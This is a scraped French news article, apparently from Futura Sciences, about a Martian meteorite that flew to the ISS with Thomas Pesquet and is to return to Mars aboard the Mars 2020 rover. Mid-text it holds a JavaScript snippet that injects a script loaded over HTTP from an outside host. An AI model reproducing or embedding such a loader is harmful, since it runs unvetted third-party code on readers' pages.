{"title": "Une météorite martienne va retourner sur Mars", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "19/10/2017", "content": "Une météorite venue de Mars et retrouvée dans le Sahara va avoir le privilège de retourner d’où elle vient. Une première ! Ce petit caillou martien a d’ailleurs déjà voyagé plusieurs fois, de la Terre vers l’espace et vice-versa. Quelle aventure... Une  météorite martienne  va rentrer chez elle. Que de voyages pour ce petit morceau de roche qui, un jour, a été arraché à la croûte martienne il y a environ 180 millions d’années. Après avoir dérivé dans l’espace interplanétaire, ce caillou a fini par traverser l’atmosphère terrestre et s’échouer dans le désert du Sahara. Découverte puis authentifiée par le Muséum d’histoire naturelle de Paris, la pierre extraterrestre de 5 g a été ensuite revendue par Luc Labenne, chasseur et collectionneur de météorites, à la Cité de l’espace. Mais son périple ne s’est pas arrêté là. Plutôt que de demeurer dans la collection, la météorite a été confiée à l’astronaute  Thomas Pesquet , qui l’a emmenée avec lui à bord de la Station spatiale internationale. Nouvelle traversée atmosphérique pour la météorite. Et encore une autre, à son retour, six mois plus tard. Le futur rover de la mission Mars 2020. © Nasa, JPL, CalTech                               Retour sur Mars avec le rover Mars 2020 Mais ce n’est pas fini. Des chercheurs ont eu l’idée de la rapatrier sur Mars. Cette fois, ce ne sera pas Thomas Pesquet qui la transportera, même s’il serait partant. Ce sera le jumeau de Curiosity, le  rover Mars 2020 . Mais d’abord, la météorite sera coupée en trois morceaux : l'un restera à la Cité de l’espace, un deuxième sera offert à l’astronaute français  « pour le remercier » , et le troisième s’envolera en 2020.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  « Au total, la pierre de Mars aura traversé quatre fois l’atmosphère terrestre et deux fois l’atmosphère martienne » , commente Sylvestre Maurice, de l’Institut de recherche en astrophysique et planétologie (Irap). L’astrophysicien est le père de ChemCam, un des instruments qui équipe l’actuel Curiosity, sur Mars depuis cinq ans. Il a aussi conçu SuperCam qui, lui, équipera Mars 2020, un rover, dont la mission sera notamment de rechercher d’éventuelles traces de vie sur la Planète rouge.  « Nous allons faire de la science avec ce petit morceau de météorite martienne,  a-t-il expliqué.  Il va nous servir à étalonner SuperCam. »  D’abord surprise, la Nasa a ensuite acceptée. Mars est un des sujets abordés par les  100 astronautes réunis  depuis lundi à Toulouse pour le 30 e  congrès mondial des astronautes. Nasa : revivez 20 ans d'exploration de Mars                       La Nasa nous invite à revivre en vidéo les temps forts de toutes les missions qui se sont succédé autour de Mars et à sa surface. Ces aventures, variées, couronnées de succès et surprenantes, nous ont beaucoup appris sur la Planète rouge et son habitabilité passée.                                       Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest", "theme": "sciences"}